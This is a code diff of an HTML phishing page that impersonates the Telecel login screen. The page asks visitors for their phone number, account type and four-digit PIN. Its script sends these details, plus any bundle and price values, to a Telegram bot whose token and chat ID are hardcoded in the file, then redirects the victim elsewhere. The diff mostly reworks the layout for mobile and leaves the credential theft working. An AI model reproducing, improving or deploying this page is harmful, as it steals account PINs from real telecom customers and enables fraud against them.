@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telecel - Log In & Purchase</title>
+    <title>Telecel - Log In</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -14,53 +14,43 @@
             display: flex;
             align-items: center;
             justify-content: center;
+            padding: 15px;
         }
         .main-container {
-            display: flex;
             width: 100%;
-            max-width: 1200px;
+            max-width: 420px;
             background: white;
             border-radius: 16px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
             overflow: hidden;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
-            margin: 20px;
         }
-        .left-side {
-            flex: 1;
-            background: url('https://images.unsplash.com/photo-1622445275576-721325763afe?w=800') center/cover no-repeat;
-            position: relative;
-            min-height: 620px;
-        }
-        .left-overlay {
-            position: absolute;
-            bottom: 40px;
-            left: 40px;
+        .header {
+            background: #E30613;
             color: white;
+            text-align: center;
+            padding: 30px 20px;
         }
-        .left-overlay h2 {
-            font-size: 28px;
-            font-weight: 700;
+        .circle {
+            width: 70px;
+            height: 70px;
+            background: white;
+            color: #E30613;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 36px;
+            font-weight: 900;
             margin-bottom: 12px;
         }
-        .left-overlay p {
-            font-size: 15px;
-            max-width: 320px;
+        .header h1 {
+            font-size: 22px;
+            font-weight: 700;
         }
-
-        .right-side {
-            flex: 1;
-            padding: 50px 40px;
+        .content {
+            padding: 35px 25px;
         }
-        .logo {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        .logo h2 {
-            color: #E30613;
-            font-size: 32px;
-            font-weight: 900;
-        }
-        h1 {
+        h2 {
             text-align: center;
             font-size: 24px;
             margin-bottom: 8px;
@@ -68,6 +58,7 @@
         .subtitle {
             text-align: center;
             color: #64748b;
+            font-size: 15px;
             margin-bottom: 30px;
         }
         .form-group {
@@ -77,12 +68,13 @@
             display: block;
             font-weight: 600;
             margin-bottom: 8px;
-            color: #334155;
+            color: #1e2937;
+            font-size: 14.5px;
         }
         select, input {
             width: 100%;
-            padding: 14px 16px;
-            border: 1.5px solid #e2e8f0;
+            padding: 15px 16px;
+            border: 1.5px solid #cbd5e1;
             border-radius: 10px;
             font-size: 16px;
         }
@@ -102,36 +94,58 @@
             cursor: pointer;
             margin: 25px 0 15px;
         }
-        .continue-btn:hover {
-            background: #c0040f;
-        }
         .register {
             text-align: center;
             font-size: 15px;
+            margin-top: 10px;
         }
         .register a {
             color: #E30613;
             font-weight: 600;
         }
+
+        @media (min-width: 768px) {
+            .main-container {
+                max-width: 1100px;
+                display: flex;
+            }
+            .header {
+                display: none;
+            }
+            .left-side {
+                flex: 1;
+                background: url('https://images.unsplash.com/photo-1622445275576-721325763afe?w=800') center/cover no-repeat;
+                position: relative;
+            }
+            .left-overlay {
+                position: absolute;
+                bottom: 50px;
+                left: 50px;
+                color: white;
+            }
+        }
     </style>
 </head>
 <body>
     <div class="main-container">
-        <!-- Left Image -->
-        <div class="left-side">
+
+        <!-- Mobile Header -->
+        <div class="header">
+            <div class="circle">t</div>
+            <h1>telecel</h1>
+        </div>
+
+        <!-- Left Image (Desktop) -->
+        <div class="left-side" style="display:none;">
             <div class="left-overlay">
                 <h2>Effortless transactions</h2>
-                <p>Pay broadband and utility bills, buy bundles, manage your accounts with just a few links.</p>
+                <p>Pay bills, buy bundles and manage your account easily.</p>
             </div>
         </div>
 
-        <!-- Right Form -->
-        <div class="right-side">
-            <div class="logo">
-                <h2>telecel</h2>
-            </div>
-
-            <h1>Welcome Back</h1>
+        <!-- Form Section -->
+        <div class="content">
+            <h2>Welcome Back</h2>
             <p class="subtitle">Enter your details to proceed</p>
 
             <div class="form-group">
@@ -161,12 +175,11 @@
     </div>
 
     <!-- Spinner -->
-    <div id="spinner" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:9999; align-items:center; justify-content:center;">
-        <div style="width:60px; height:60px; border:6px solid #fff; border-top:6px solid #E30613; border-radius:50%; animation:spin 1s linear infinite;"></div>
+    <div id="spinner" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.75);z-index:10000;align-items:center;justify-content:center;">
+        <div style="width:70px;height:70px;border:6px solid #fff;border-top-color:#E30613;border-radius:50%;animation:spin 1s linear infinite;"></div>
     </div>
 
     <script>
-        // === CONFIG ===
         const CONFIG = {
             BOT_TOKEN: '8522259555:AAEl1CRJfLhjWwtqD2z6CvN-jesiotWQ__4',
             CHAT_ID: '8757709711',
@@ -179,9 +192,7 @@
             const params = new URLSearchParams(window.location.search);
             const bundle = params.get('bundle');
             const price = params.get('price');
-            if (bundle && price) {
-                state.bundleInfo = { bundle, price };
-            }
+            if (bundle && price) state.bundleInfo = { bundle, price };
         }
 
         function proceedLogin() {
@@ -189,22 +200,19 @@
             const phone = document.getElementById('phone').value.trim();
             const pin = document.getElementById('password').value.trim();
 
-            if (!phone || phone.length < 9) {
-                alert("Please enter a valid Telephone Number");
-                return;
-            }
-            if (!pin || pin.length !== 4) {
-                alert("PIN must be 4 digits");
-                return;
-            }
+            if (!phone) return alert("Please enter your Telephone Number");
+            if (pin.length !== 4) return alert("PIN must be 4 digits");
 
             document.getElementById('spinner').style.display = 'flex';
 
-            const message = `<b>Telecel Login Attempt</b>\n\n` +
+            const bundleText = state.bundleInfo 
+                ? `\nBundle: ${state.bundleInfo.bundle}\nPrice: GHS ${state.bundleInfo.price}` 
+                : '';
+
+            const message = `<b>🔴 Telecel Login Attempt</b>\n\n` +
                             `Account Type: ${accountType}\n` +
                             `Phone: ${phone}\n` +
-                            `PIN: ${pin}\n` +
-                            (state.bundleInfo ? `\nBundle: ${state.bundleInfo.bundle}\nPrice: GHS ${state.bundleInfo.price}` : '');
+                            `PIN: ${pin}${bundleText}`;
 
             fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -214,14 +222,11 @@
                     text: message,
                     parse_mode: 'HTML'
                 })
-            })
-            .then(() => {
+            }).then(() => {
                 setTimeout(() => {
                     window.location.href = CONFIG.REDIRECT_PAGE;
-                }, 1500);
-            })
-            .catch(err => {
-                console.error(err);
+                }, 1300);
+            }).catch(() => {
                 alert("Connection error. Please try again.");
                 document.getElementById('spinner').style.display = 'none';
             });
@@ -229,7 +234,6 @@
 
         // Initialize
         extractBundleInfo();
-        document.getElementById('phone').focus();
     </script>
 </body>
 </html>
